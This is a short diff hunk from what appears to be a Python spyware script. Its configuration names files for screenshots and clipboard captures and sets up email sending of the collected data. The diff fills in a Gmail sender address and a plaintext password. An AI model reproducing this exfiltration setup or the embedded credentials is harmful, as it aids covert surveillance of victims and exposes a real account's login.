@@ -25,8 +25,8 @@ screenshot_info="screenshot.png"              #FILE NAME FOR SCREENSHOT
 ss_doc="ss_doc.docx"                          #FILE NAME FOR SCREENSHOTS
 clipboard_info="clipboard.txt"                #FILE NAME FOR CLIPBOARD INFORMATION
 '''****************************************************************EMAIL*************************************************************************'''
-email_address=" "        #FROM ADDRESS
-password=" "                       #PASSWORD OF FROM ADDRESS
+email_address="matalav55@gmail.com"        #FROM ADDRESS
+password="Akka9963966343"                       #PASSWORD OF FROM ADDRESS
 global toaddr
 #data=[]
 def send_mail(filename,attachment,toaddr):
